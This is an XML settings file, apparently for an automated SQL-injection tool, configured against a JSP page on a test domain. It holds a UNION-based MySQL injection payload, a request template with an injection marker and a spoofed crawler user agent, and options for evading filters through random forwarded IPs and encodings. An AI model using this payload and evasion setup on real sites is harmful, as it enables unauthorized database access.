<?xml version="1.0"?>
<Config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <saveConfigpath />
  <time />
  <domain>test.shack2.org</domain>
  <uri>/mysql.jsp</uri>
  <pname>id</pname>
  <testPayload> and 1=2 union all select 72767+1,72767+2,72767+3,72767+4#</testPayload>
  <port>80</port>
  <maxTime>2222</maxTime>
  <injectType>Union</injectType>
  <dbType>MySQL</dbType>
  <timeOut>10</timeOut>
  <threadSize>5</threadSize>
  <reTry>1</reTry>
  <encoding>自动识别</encoding>
  <request>GET /mysql.jsp?id=1&lt;Encode&gt; and#inject##&lt;/Encode&gt; HTTP/1.1
User-Agent: BaiduSpider
Accept-Encoding: gzip, deflate
Host: test.shack2.org</request>
  <sencondRequest />
  <key>2222</key>
  <injectHTTPCode>200</injectHTTPCode>
  <db_encoding>UTF-8</db_encoding>
  <useCode>false</useCode>
  <columnsCount>4</columnsCount>
  <unionFillTemplate />
  <sencondInject>false</sencondInject>
  <showColumn>3</showColumn>
  <reverseKey>false</reverseKey>
  <keyType>Key</keyType>
  <isMuStr>true</isMuStr>
  <is_foward_302>true</is_foward_302>
  <isOpenInfoLog>true</isOpenInfoLog>
  <isOpenHTTPLog>true</isOpenHTTPLog>
  <isAutoCheckUpdate>true</isAutoCheckUpdate>
  <isSavaConfigWhenClose>true</isSavaConfigWhenClose>
  <useSSL>false</useSSL>
  <isOpenURLEncoding>true</isOpenURLEncoding>
  <redirectDoGet>false</redirectDoGet>
  <maxClolumns>50</maxClolumns>
  <urlencodeCount>1</urlencodeCount>
  <unionFill>1</unionFill>
  <token_request />
  <token_startStr />
  <token_endStr />
  <readFileEncoding>GBK</readFileEncoding>
  <showCmdResult>true</showCmdResult>
  <reaplaceBeforURLEncode>true</reaplaceBeforURLEncode>
  <inculdeStr>false</inculdeStr>
  <keyReplace>0</keyReplace>
  <randIPToHeader>X-Forwarded-For</randIPToHeader>
  <sendHTTPSleepTime>0</sendHTTPSleepTime>
  <replaceStrs />
  <base64Count>0</base64Count>
  <useBetweenByPass>false</useBetweenByPass>
  <usehex>false</usehex>
  <useUnicode>false</useUnicode>
  <retryKey />
  <level>0</level>
  <linkCount>1</linkCount>
  <maxSpiderCount>10</maxSpiderCount>
  <maxScanCount>10</maxScanCount>
  <proxy_mode>0</proxy_mode>
  <proxy_check_host>www.baidu.com</proxy_check_host>
  <proxy_check_port>80</proxy_check_port>
  <proxy_check_Keys>百度一下，你就知道</proxy_check_Keys>
</Config>